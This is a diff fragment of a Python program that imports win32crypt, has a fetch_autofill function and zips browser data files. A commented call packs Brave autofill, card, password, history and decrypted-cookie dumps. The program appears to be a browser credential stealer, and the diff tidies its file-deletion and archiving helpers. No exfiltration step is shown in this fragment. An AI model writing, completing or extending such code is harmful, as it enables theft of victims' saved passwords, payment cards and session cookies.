@@ -12,7 +12,7 @@ import win32crypt
 
 
 
-##?? use this function?
+##??use this function??
 #def load_path(id):
 #    try:
 #        with open("todo.txt", "r") as f:
@@ -27,7 +27,7 @@ import win32crypt
 #        return dir_path
 #    elif id == "db":
 #        return db_path
-##?? use this function?
+##??use this function??
 
 def delete_files(files):
     try:
@@ -370,30 +370,37 @@ def fetch_autofill(dir):
 ##Zip files
 ##
 
+
 #def zip(name, files):
 #    try:
 #        with zipfile.ZipFile(name, "w") as zip:
 #            for file in files:
 #                try:
 #                    zip.write(file)
-#                except:
-#                    pass
+#                except: pass
 #    except:
 #        pass
 
 def zip(name, files):
     try:
-        with zipfile.ZipFile(name, "w") as zip:
-            for file in files:
-                try:
-                    if os.path.exists(file):
-                        zip.write(file)
-                    else: continue
-                except:
-                    pass
+        if check_exist(files):
+            with zipfile.ZipFile(name, "w") as zip:
+                for file in files:
+                    try:
+                        if os.path.exists(file):
+                            zip.write(file)
+                        else: continue
+                    except:
+                        pass
     except:
         pass
 
+
+def check_exist(files):
+    for file in files:
+        if os.path.exists(file):
+            return True
+    
 #zip("Brave.zip", ["autofill.txt", "cards.txt", "bookmarks.txt", "downloads.txt", "history.txt", "passwords.txt", "decrypted-cookies.txt", "cookies.txt"])
 
 
